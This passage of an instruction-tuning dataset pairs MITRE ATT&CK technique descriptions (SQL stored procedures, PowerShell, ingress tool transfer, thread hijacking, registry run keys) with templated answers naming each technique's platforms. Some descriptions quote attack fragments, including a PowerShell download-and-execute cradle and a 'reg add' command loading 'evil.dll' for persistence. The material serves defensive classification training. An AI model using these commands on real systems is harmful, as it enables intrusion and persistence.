    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server. \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Server Software Component: SQL Stored Procedures (T1505.001);\nTechnique Server Software Component: SQL Stored Procedures (T1505.001) is applicable to platforms: Windows, Linux;\nTherefore, the given procedure description is related to platforms: Windows, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server. \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.",
      "answer": "The provided description is related to MITRE technique Server Software Component: SQL Stored Procedures (T1505.001);\nTechnique Server Software Component: SQL Stored Procedures (T1505.001) is applicable to platforms: Windows, Linux;\nTherefore, the given procedure description is related to platforms: Windows, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: PowerShell (T1059.001);\nTechnique Command and Scripting Interpreter: PowerShell (T1059.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Injection: Thread Execution Hijacking (T1055.003);\nTechnique Process Injection: Thread Execution Hijacking (T1055.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
      "answer": "The provided description is related to MITRE technique Process Injection: Thread Execution Hijacking (T1055.003);\nTechnique Process Injection: Thread Execution Hijacking (T1055.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.\n\nIn addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment. In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for Temporary Elevated Cloud Access. While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding Additional Cloud Credentials or assigning Additional Cloud Roles.",
    "context": "",
    "output": "The provided description is related to MITRE technique Create Account: Cloud Account (T1136.003);\nTechnique Create Account: Cloud Account (T1136.003) is applicable to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.\n\nIn addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment. In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for Temporary Elevated Cloud Access. While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding Additional Cloud Credentials or assigning Additional Cloud Roles.",
      "answer": "The provided description is related to MITRE technique Create Account: Cloud Account (T1136.003);\nTechnique Create Account: Cloud Account (T1136.003) is applicable to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Office 365,  SaaS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software\\\\Wow6432Node\\\\\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon. \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: \n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Winlogon Helper DLL (T1547.004);\nTechnique Boot or Logon Autostart Execution: Winlogon Helper DLL (T1547.004) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software\\\\Wow6432Node\\\\\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon. \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: \n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Winlogon Helper DLL (T1547.004);\nTechnique Boot or Logon Autostart Execution: Winlogon Helper DLL (T1547.004) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. \n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and esentutl) to create shadow copies or backups of data from system volumes.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Direct Volume Access (T1006);\nTechnique Direct Volume Access (T1006) is applicable to platforms: Windows, Network;\nTherefore, the given procedure description is related to platforms: Windows, Network.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. \n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and esentutl) to create shadow copies or backups of data from system volumes.",
      "answer": "The provided description is related to MITRE technique Direct Volume Access (T1006);\nTechnique Direct Volume Access (T1006) is applicable to platforms: Windows, Network;\nTherefore, the given procedure description is related to platforms: Windows, Network.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add 